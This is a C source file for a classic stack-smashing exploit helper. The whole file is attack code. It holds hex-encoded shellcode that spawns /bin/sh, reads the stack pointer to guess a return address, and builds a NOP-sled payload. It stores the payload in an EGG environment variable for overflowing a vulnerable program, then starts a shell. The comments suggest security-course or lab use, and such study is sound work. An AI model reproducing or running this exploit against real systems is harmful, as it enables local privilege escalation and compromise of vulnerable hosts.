#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define NOP 0x90
#define DEFAULT_OFFSET 0
#define DEFAULT_BUF_SIZE 1024

// This code spawns a shell (see exploit.nasm).
char shellcode[] = "\xeb\x0f\x31\xc0\x83\xc0\x0b\x5b\x88\x63\x07\x31\xc9\x31\xd2\xcd\x80\xe8\xec\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e";

// Retrieve the stack pointer. In a system without ASLR, all programs will have similar values for their stack pointers at runtime.
unsigned long long get_sp(void) {
    __asm__("movl %esp, %eax");
}

void main(int argc, char *argv[]) {
    char *buff, *ptr;
    unsigned long long *addr_ptr, addr;
    unsigned long int offset = DEFAULT_OFFSET, bsize = DEFAULT_BUF_SIZE;
    int i;

    if(argc > 1) bsize = atoi(argv[1]);
    if(argc > 2) offset = atoi(argv[2]);

    if(!(buff = malloc(bsize))) {
        printf("Memory allocation failed");
        exit(0);
    }

    // Retrieve address of stack.
    addr = get_sp() - offset;
    printf("Address: 0x%x\n", addr);

    // Load our payload with the target address.
    ptr = buff;
    addr_ptr = (unsigned long long *) ptr;
    for(i = 0; i < bsize; i+=8)
        *(addr_ptr++) = addr;

    // Load the beginning of our payload with NOPs.
    for(i = 0; i < bsize / 2; i++)
        buff[i] = NOP;

    // Load the middle of our payload with the shellcode.
    ptr = buff + ((bsize / 2) - (strlen(shellcode) / 2));
    for(i = 0; i < strlen(shellcode); i++)
        *(ptr++) = shellcode[i];

    buff[bsize - 1] = '\0';

    // Copy our payload into an environment variable.
    memcpy(buff, "EGG=", 4);
    putenv(buff);
    system("/bin/bash");
}
